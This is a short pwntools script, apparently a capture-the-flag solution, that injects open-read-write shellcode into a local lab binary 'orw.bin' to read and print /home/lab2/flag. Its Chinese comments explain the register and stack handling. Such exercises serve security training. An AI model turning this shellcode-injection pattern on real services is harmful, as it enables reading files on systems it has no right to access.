
#!/usr/bin/env python
#coding:utf-8

from pwn import *
from pwn import shellcraft as sc
context.log_level = "debug"

shellcode = sc.pushstr("/home/lab2/flag")
shellcode += sc.open("esp")
#  open返回的文件文件描述符存贮在eax寄存器里 
shellcode += sc.read("eax", "esp", 0x100)
#  open读取的内容放在栈顶 
#  write函数在栈顶读取0x100大小的内容并打印出来
shellcode += sc.write(1, "esp", 0x100)

io = process("./orw.bin")
#print(asm(shellcode))
io.sendlineafter("shellcode:", asm(shellcode))
print io.recvall()
io.close()


